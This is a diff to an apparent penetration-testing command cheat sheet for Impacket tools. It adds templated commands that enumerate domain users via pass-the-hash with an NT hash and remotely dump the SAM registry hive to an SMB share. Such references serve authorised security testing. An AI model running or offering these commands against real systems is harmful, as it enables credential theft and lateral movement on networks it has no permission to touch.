@@ -9,10 +9,23 @@
 lookupsid.py '<domain>/<user>:<password>'@<ip>
 ```
 
+## lookupsid - SID User Enumeration,  extract the information about what users exist and their data.  (pth)
+#plateform/linux #target/remote #cat/RECON 
+
+```
+lookupsid.py --hashes : <nt_hash>'<domain>/<user>'@<ip>
+```
+
+
 ## reg - query registry info remotely
 #plateform/linux #target/remote #cat/RECON 
 ```
 reg.py '<domain>/<user>:<password>'@<ip> query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
+```
+## reg - dump sam remotely
+#plateform/linux #target/remote #cat/RECON 
+```
+reg.py '<domain>/<user>:<password>'@<ip>  backup -o '<smb_share_UNC>'
 ```
 
 ## rpcdump - list rpc endpoint
